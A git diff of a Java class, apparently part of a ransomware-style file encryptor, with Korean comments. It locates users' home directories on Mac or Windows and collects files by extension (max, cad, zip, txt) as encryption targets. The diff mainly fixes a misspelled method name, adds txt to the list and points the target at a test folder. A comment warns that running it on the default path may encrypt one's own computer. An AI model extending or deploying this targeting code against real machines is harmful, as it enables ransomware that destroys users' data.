@@ -12,7 +12,7 @@ import java.util.List;
 public class SearchDirectory {
 
     private boolean isWindow;
-    private String defaultDirectiory;
+    private String defaultDirectory;
     private List<File> allFiles = new ArrayList<>();
     private List<String> containsfilters = new ArrayList<>();
     private int filecounts = 0;
@@ -21,15 +21,15 @@ public class SearchDirectory {
     {
         /**
          * !!!주의!!!
-         * 암호화 테스트 코드를 실행할 때에는 절대 setDefaultDirectiory()를 사용하여 테스트를 하지 마세요
+         * 암호화 테스트 코드를 실행할 때에는 절대 setDefaultDirectory()를 사용하여 테스트를 하지 마세요
          * 본인의 컴퓨터가 암호화 될 수 있습니다
          **/
 
 
 
         //1. 암호화 할 경로 설정
-//        setDefaultDirectiory("/Users/codertimo/Develop/EncryptionTest/");
-        setDefaultDirectiory();
+        setDefaultDirectory("C:\\test");
+        //setDefaultDirectory();
 
         //2. 암호화할 파일 타입을 설정
         initContainFilter();
@@ -37,8 +37,8 @@ public class SearchDirectory {
         //3.
 
         System.out.println("디렉토리 검색 시작");
-        System.out.println(defaultDirectiory);
-        subDirList(defaultDirectiory);
+        System.out.println(defaultDirectory);
+        subDirList(defaultDirectory);
         System.out.println("디렉토리 검색 끝");
     }
 
@@ -58,19 +58,20 @@ public class SearchDirectory {
         containsfilters.add("max");
         containsfilters.add("cad");
         containsfilters.add("zip");
+        containsfilters.add("txt");
     }
 
     /**
      * OS별 최상위 디렉토리 설정
      */
-    private void setDefaultDirectiory()
+    private void setDefaultDirectory()
     {
         String os = System.getProperty("os.name").split(" ")[0];
         switch (os)
         {
             case "Mac":
                 isWindow = false;
-                setMacDefaultDirectiory();
+                setMacDefaultDirectory();
                 break;
 
             case "Windows":
@@ -85,16 +86,16 @@ public class SearchDirectory {
 
     /**
      * 최상위 디렉토리 사용자 설정
-     * @param defaultDirectiory
+     * @param defaultDirectory
      */
-    private void setDefaultDirectiory(String defaultDirectiory)
+    private void setDefaultDirectory(String defaultDirectory)
     {
-        this.defaultDirectiory = defaultDirectiory;
+        this.defaultDirectory = defaultDirectory;
     }
     /**
      * 기본 디렉토리 설정 : Mac 용
      */
-    private void setMacDefaultDirectiory()
+    private void setMacDefaultDirectory()
     {
         File macDir = new File("/Users/");
         File[] fileList = macDir.listFiles();
@@ -104,7 +105,7 @@ public class SearchDirectory {
                     System.out.println(file.getName());
                     if (!file.getName().equals("Guest") && !file.getName().equals("Shared"))
                     {
-                        this.defaultDirectiory = file.getCanonicalPath();
+                        this.defaultDirectory = file.getCanonicalPath();
                     }
                 }
             }
@@ -126,7 +127,7 @@ public class SearchDirectory {
             if (fileList != null) {
                 for (File file : fileList) {
                     if (!file.getName().equals("Public")) {
-                        this.defaultDirectiory = file.getCanonicalPath();
+                        this.defaultDirectory = file.getCanonicalPath();
                     }
                 }
             }
